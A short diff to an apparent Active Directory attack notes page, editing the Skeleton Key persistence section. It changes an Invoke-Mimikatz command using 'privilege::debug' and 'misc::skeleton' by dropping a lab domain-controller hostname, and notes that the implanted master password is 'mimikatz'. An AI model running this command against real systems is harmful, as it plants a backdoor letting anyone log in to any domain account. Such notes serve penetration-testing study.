@@ -13,7 +13,7 @@ Skeleton key is a persistence technique where it is possible to inject malware t
 ```powershell
 # needs DA privs
 # password would be "mimikatz"
-Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' 
 ```
 
 ## Access any machine
